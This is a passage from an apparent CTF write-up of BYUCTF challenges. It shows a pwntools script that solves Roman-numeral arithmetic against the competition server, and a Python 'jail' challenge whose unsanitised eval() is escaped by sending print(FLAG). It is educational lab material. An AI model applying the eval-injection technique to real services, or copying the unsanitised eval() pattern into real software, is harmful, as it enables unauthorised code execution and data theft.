&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#reverse mapping
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(sym)):
&lt;&#x2F;span&gt;&lt;span&gt;		ans_roman &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;re&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sub&lt;&#x2F;span&gt;&lt;span&gt;(sym[i]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(num[i])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;ans_roman)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;ans_roman
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;roman_to_int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;roman&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    roman_dict &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;I&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;V&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;X&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;L&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;C&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;D&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;500&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;CM&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;900&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;M&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;    result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;    prev_value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;reversed&lt;&#x2F;span&gt;&lt;span&gt;(roman):
&lt;&#x2F;span&gt;&lt;span&gt;        value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;roman_dict[char]
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;prev_value:
&lt;&#x2F;span&gt;&lt;span&gt;            result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;value
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span&gt;value
&lt;&#x2F;span&gt;&lt;span&gt;        prev_value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;value
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;result
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;int_to_roman&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;num&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	roman_dict &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;I&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;IV&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;V&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;IX&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;X&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;40&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;XL&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;L&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;90&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;XC&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;C&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;400&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;CD&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;500&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;D&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;900&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;CM&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;M&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;	result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;symbol &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;reversed&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;sorted&lt;&#x2F;span&gt;&lt;span&gt;(roman_dict&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;items&lt;&#x2F;span&gt;&lt;span&gt;())):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;value:
&lt;&#x2F;span&gt;&lt;span&gt;			result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;symbol
&lt;&#x2F;span&gt;&lt;span&gt;			num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span&gt;value
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;result
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# solution(&amp;quot;10110 * 10&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;remote&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;byuctf.xyz&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;40014&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;flag!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(s)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;byu&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;s:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;flag found&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;	ans &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;solution&lt;&#x2F;span&gt;&lt;span&gt;(s)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(ans&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;	target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(ans)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# byuctf{just_over_here_testing_your_programming_skills_:)}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;A quick walkthrough of the code : The problem equation was passed to the solution(), the equation was splitted into [lhs,operator,rhs]. Then the lhs and rhs values are converted from roman to integers, the operation specified in the equation was performed by the eval(). The solution was converted back to roman from integer, then it was sent to the remote server. The entire process was done until we get the flag.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{just_over_here_testing_your_programming_skills_:)}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;jail&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#jail&quot; aria-label=&quot;Anchor link for: jail&quot;&gt;Jail&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;leet1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#leet1&quot; aria-label=&quot;Anchor link for: leet1&quot;&gt;leet1&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Just make 1337
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nc byuctf.xyz 40000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached file : [leet1.py]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;A simple jail breaking warmup challenge.&lt;&#x2F;p&gt;
&lt;p&gt;The leet1.py&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;re
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;FLAG &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;flag.txt&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;inp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;re&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;search&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;\d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;inp) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;eval&lt;&#x2F;span&gt;&lt;span&gt;(inp) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1337&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Nope&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(FLAG)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Okay, the &lt;code&gt;eval()&lt;&#x2F;code&gt; evaluating the input without any sanitation of input. So, we can just input &lt;code&gt;print(FLAG)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; nc byuctf.xyz 40000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; print(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;FLAG&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;byuctf{simple_bypasses!&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{simple_bypasses!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;leet2&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#leet2&quot; aria-label=&quot;Anchor link for: leet2&quot;&gt;leet2&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Just make 1337 (again)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nc byuctf.xyz 40001
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached file : [leet2.py]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;leet2.py&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;re
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;FLAG &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;flag.txt&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
